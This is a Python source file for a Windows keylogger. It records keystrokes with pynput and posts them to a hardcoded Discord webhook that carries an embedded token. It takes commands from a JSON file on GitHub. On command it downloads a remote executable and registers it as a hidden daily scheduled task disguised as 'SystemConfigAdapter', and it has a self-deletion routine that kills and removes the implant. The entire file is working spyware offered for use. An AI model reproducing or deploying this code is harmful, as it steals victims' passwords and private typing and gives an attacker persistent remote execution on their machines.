import time
import sched
import requests
import json
import os
import tempfile
import subprocess
import win32com.client
from pynput import keyboard


keys = []
webhook_url = "https://discord.com/api/webhooks/971535896992186451/375caLjcn9gIe92L7eLPZN4D8ktVAMqoOXo7JfWjwEAXB3_q2Zc9hI9yvPzJ98Yt81Dv"
temp_dir = tempfile.gettempdir()

file_path = "keyboard_input.txt"


def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(str(key))


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


def write_to_file():
    with open('keyboard_input.txt', 'w') as f:
        f.write(' '.join(keys))


# Set recording time to 10 minutes (600 seconds)


def start_loop(timer):
    # Start listener in a separate thread
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    # Start recording timer
    start_time = time.time()
    # Write recorded keys to file every 10 seconds
    while time.time() - start_time < timer:
        time.sleep(10)
        write_to_file()
    # Stop listener and write final keys to file
    listener.stop()
    write_to_file()
    datas = ' '.join(keys)
    return datas

# Define the task to be executed


def Heimdall(data):

    temp_dir = tempfile.gettempdir()

    try:

        if data['update']:
            url = data['update']

            # specify the destination folder
            dest_folder = temp_dir

            response = requests.get(url)
            file_name = os.path.basename(response.url)
            with open(dest_folder, 'wb') as f:
                f.write(response.content)

            # create a Task Scheduler object
            scheduler = win32com.client.Dispatch('Schedule.Service')

            # connect to the local machine
            scheduler.Connect()

            # create a new task
            task = scheduler.NewTask(0)

            # set the task settings
            task.RegistrationInfo.Description = "System Config Checker"
            task.Settings.Enabled = True
            task.Settings.Hidden = True
            task.Settings.AllowDemandStart = True

            # create a trigger to run the task daily at 3:00 PM
            trigger = task.Triggers.Create(2)  # 2 = Daily trigger
            trigger.StartBoundary = "2023-03-15T22:55:00"  # change to desired start time
            trigger.DaysInterval = 1  # run every 1 day
            trigger.Enabled = True

            # create an action to run a executable
            action = task.Actions.Create(0)  # 0 = Execute a program
            action.Path = f"{temp_dir}\\{file_name}"  # path to executable

            # register the task with Task Scheduler
            folder = scheduler.GetFolder("\\")
            task_registered = folder.RegisterTaskDefinition(
                "SystemConfigAdapter",  # name of the task
                task,  # task object
                6,  # create or update the task
                "",  # empty user credentials
                "",  # empty user credentials
                0)  # do not modify the task XML
            return {"Status": "ok"}
        else:

            return {"status": "error 503"}
    except Exception as e:
        message = {
            "content": f"Error {e}"
        }
        json_message = json.dumps(message)
        response = requests.post(webhook_url, data=json_message, headers={
                                 "Content-Type": "application/json"})


def thor_hammer():
    try:
        delete_script = f"""
            @echo off
            taskkill /im main.exe /F
            DEL {temp_dir}\\main.exe
            DEL .\delete_script.bat
            """

        with open("delete_script.bat", "w") as f:
            f.write(delete_script)

        subprocess.run(["delete_script.bat"])
        # Exit the original script
        message = {
            "content": "WW2 deleted successfully"
        }
        json_message = json.dumps(message)
        response = requests.post(webhook_url, data=json_message, headers={
                                 "Content-Type": "application/json"})
        return {"Status": "ok"}

        exit()
    except Exception as e:

        message = {
            "content": f"Error {e}"
        }
        json_message = json.dumps(message)
        response = requests.post(webhook_url, data=json_message, headers={
                                 "Content-Type": "application/json"})

        return {'status': 'Error D'}


def get_data():
    # Replace with the link to the raw text file on GitHub
    github_link = 'https://raw.githubusercontent.com/samuelarjasbi/test/main/test.json?v=1'

    # Make a request to the GitHub API to get the file content
    response = requests.get(github_link)

    # url = "https://www.reddit.com/user/One-Pomegranate-3698/comments/11s77hi/json_file/?utm_source=share&utm_medium=web2x&context=3"

    # response = requests.get(url)

    # soup = BeautifulSoup(response.content, 'html.parser')
    # data = { "time" : 0}
    # for tag in soup.find_all('code'):
    #     if '"hello": "hi"' in tag.text:
    #         data = json.loads(tag.text)
    #         print("1")
    #     else :
    #         pass
    # If the request was successful (i.e., status code 200), print the file content
    if response.status_code == 200:
        content = response.json()
        data = content
        if data['time'] != 0:
            message = {
                "content": f"================ \n start recording for {data['time']} seconds which is {data['time']/60} minutes \n ================"
            }
            json_message = json.dumps(message)
            response = requests.post(webhook_url, data=json_message, headers={
                                     "Content-Type": "application/json"})
    else:
        data = (f'An error occurred: {response.status_code}')
        message = {
            "content": f"{data}"
        }
        json_message = json.dumps(message)
        response = requests.post(webhook_url, data=json_message, headers={
                                 "Content-Type": "application/json"})

    if data['action'] == 1:
        thor_hammer()

    elif data['action'] == 2:
        Heimdall(data)
        thor_hammer()

    if data['time'] != 0:
        input_key = start_loop(data['time'])
        message = {
            "content": f"ending : {data}"
        }
        json_message = json.dumps(message)
        response = requests.post(webhook_url, data=json_message, headers={
                                 "Content-Type": "application/json"})
        data['status'] = "End of Process"
        return data
    elif data['time'] == 0:
        # message = {
        #     "content": f"{data}"
        # }
        # json_message = json.dumps(message)
        # response = requests.post(webhook_url, data=json_message, headers={
        #                          "Content-Type": "application/json"})
        return data


# Create a scheduler object
scheduler = sched.scheduler(time.time, time.sleep)

# Define the interval (in seconds) for the task to be executed
interval = 5

# Store the returned value in a variable outside of the function
value = None

# Define a wrapper function that calls the task function and stores the returned value


def wrapper():
    global value
    value = get_data()

# Schedule the task to be executed every 5 minutes


def schedule_task():
    scheduler.enter(interval, 1, wrapper)
    scheduler.run()
    print(value)
    if value['time'] != 0:
        with open(file_path, "rb") as f:
            file_data = f.read()

        message = {
            "content": f"{' '.join(keys)}"
        }
        response = requests.post(webhook_url, data=message,
                                 files={"file": file_data})
        os.remove(file_path)
    schedule_task()


schedule_task()
